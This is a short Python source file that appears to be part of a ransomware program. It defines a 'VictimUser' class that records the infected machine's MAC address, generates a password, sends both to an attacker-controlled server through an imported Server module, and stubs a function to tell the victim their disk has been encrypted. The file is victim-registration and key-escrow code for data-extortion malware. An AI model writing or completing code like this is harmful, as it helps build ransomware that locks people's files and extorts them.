from uuid import getnode as getMac

import Settings
from Server import Server


class VictimUser:

    def __init__(self):
        self.MAC = getMac(); # Get runner machine's mac addr
        self.Psw = Settings.genRndPsw() # Generate strong password
        
    def init_data(self): # Check for data presence on server, otherwise push current user data to server
        if Server.pull_user_data(self.MAC) == False:
            Server.push_user_data(self.MAC, self.Psw)


    # Notify user of disk encryption completion
    def advise(self, msg):
        return True;
